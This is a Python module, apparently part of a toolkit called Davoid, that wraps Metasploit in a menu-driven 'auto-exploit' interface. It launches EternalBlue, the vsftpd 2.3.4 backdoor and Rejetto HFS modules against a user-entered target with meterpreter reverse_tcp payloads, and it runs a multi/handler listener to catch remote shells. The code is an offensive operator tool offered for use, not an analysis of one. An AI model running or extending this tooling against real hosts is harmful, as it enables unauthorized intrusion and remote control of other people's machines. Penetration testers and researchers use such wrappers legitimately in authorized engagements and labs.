import os
import subprocess
import questionary
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from core.context import ctx

console = Console()


class MetasploitEngine:
    def __init__(self):
        # Locate msfconsole on the system
        try:
            self.msf_path = subprocess.run(
                ['which', 'msfconsole'], capture_output=True, text=True).stdout.strip()
        except:
            self.msf_path = ""

    def check_installed(self):
        if not self.msf_path or not os.path.exists(self.msf_path):
            console.print(
                "[bold red][!] Metasploit Framework not found![/bold red]")
            console.print("[yellow]Please install Metasploit: curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall[/yellow]")
            return False
        return True

    def interactive_console(self):
        console.print(
            "[bold green][+] Hooking into Interactive Metasploit Console...[/bold green]")
        console.print("[dim]Type 'exit' to return to Davoid.[/dim]\n")
        # Launch MSF directly in the current terminal session
        subprocess.run([self.msf_path])

    def auto_exploit(self):
        # Pull default IPs from Davoid's global context
        default_rhost = ctx.get("RHOST") or "192.168.1.1"
        default_lhost = ctx.get("LHOST") or "127.0.0.1"

        target = questionary.text(
            "Target IP (RHOST):", default=default_rhost, style=Q_STYLE).ask()
        if not target:
            return

        lhost = questionary.text(
            "Your IP (LHOST):", default=default_lhost, style=Q_STYLE).ask()
        if not lhost:
            return

        # Common Automated Exploits
        module = questionary.select("Select Exploit Module:", choices=[
            "exploit/windows/smb/ms17_010_eternalblue (Windows SMB)",
            "exploit/multi/handler (Generic Listener)",
            "exploit/unix/ftp/vsftpd_234_backdoor (vsFTPd 2.3.4)",
            "exploit/windows/http/rejetto_hfs_exec (HFS 2.3)"
        ], style=Q_STYLE).ask()

        if not module:
            return

        # Clean up the module string
        clean_module = module.split()[0]

        # Determine payload based on exploit
        payload = "windows/x64/meterpreter/reverse_tcp"
        if "multi/handler" in clean_module:
            payload = questionary.text("Listener Payload (e.g. linux/x64/meterpreter/reverse_tcp):",
                                       default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
        elif "unix" in clean_module:
            payload = "cmd/unix/interact"

        # Build the automated MSF command
        msf_cmd = f"use {clean_module}; set RHOSTS {target}; set LHOST {lhost}; set PAYLOAD {payload}; exploit"

        console.print(Panel(
            f"[bold cyan]Deploying Exploit...[/bold cyan]\n[white]Target:[/white] {target}\n[white]Module:[/white] {clean_module}", border_style="red"))

        # Run msfconsole silently passing the command array
        subprocess.run([self.msf_path, "-q", "-x", msf_cmd])

    def run(self):
        draw_header("Metasploit Integration Engine")

        if not self.check_installed():
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        while True:
            choice = questionary.select("Metasploit Operations:", choices=[
                "1. Auto-Exploit Target (Guided)",
                "2. Multi/Handler Listener (Catch Shells)",
                "3. Interactive MSF Console",
                "Back"
            ], style=Q_STYLE).ask()

            if not choice or choice == "Back":
                break
            elif "Auto-Exploit" in choice:
                self.auto_exploit()
            elif "Handler" in choice:
                lhost = ctx.get("LHOST") or "0.0.0.0"
                lport = questionary.text(
                    "LPORT:", default="4444", style=Q_STYLE).ask()
                payload = questionary.text(
                    "Payload:", default="windows/x64/meterpreter/reverse_tcp", style=Q_STYLE).ask()
                msf_cmd = f"use exploit/multi/handler; set LHOST {lhost}; set LPORT {lport}; set PAYLOAD {payload}; exploit -j"
                subprocess.run([self.msf_path, "-q", "-x", msf_cmd])
            elif "Interactive" in choice:
                self.interactive_console()


def run_msf():
    engine = MetasploitEngine()
    engine.run()
